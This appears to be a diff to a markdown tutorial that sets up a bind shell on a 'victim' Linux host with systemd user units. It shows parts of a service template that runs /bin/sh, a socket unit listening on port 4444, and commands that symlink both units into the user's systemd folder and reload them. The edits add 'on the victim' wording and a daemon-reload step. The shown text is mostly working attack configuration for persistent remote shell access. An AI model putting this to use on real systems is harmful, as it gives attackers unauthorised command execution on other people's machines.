@@ -46,10 +46,9 @@ The socket file (`bindsh.socket`) uses:
 
 ## Step by Step
 
-1. Generate a service template file to process sh commands
+1. Generate a service template file to process sh commands on the victim
 
 ```ini
-$ cat bindsh@.service
 ; https://www.freedesktop.org/software/systemd/man/systemd.service.html
 [Unit]
 Description=A simple bind shell - sh half
@@ -64,7 +63,6 @@ ExecStart=/bin/sh
 2. Generate a socket file to listen on port 4444 of the victim
 
 ```ini
-$ cat bindsh.socket
 ; https://www.freedesktop.org/software/systemd/man/systemd.socket.html
 [Unit]
 Description=A simple bind shell - socket half
@@ -75,12 +73,13 @@ FreeBind=true
 Accept=yes
 ```
 
-3. Install into the systemd user folder on the victim
+3. Install into the systemd user folder on the victim and reload the units
 
 ```sh
 $ mkdir -p ~/.config/systemd/user/
 $ ln -s `pwd`/bindsh@.service ~/.config/systemd/user/
 $ ln -s `pwd`/bindsh.socket ~/.config/systemd/user/
+$ systemctl --user daemon-reload
 ```
 
 5. Start the TCP listener
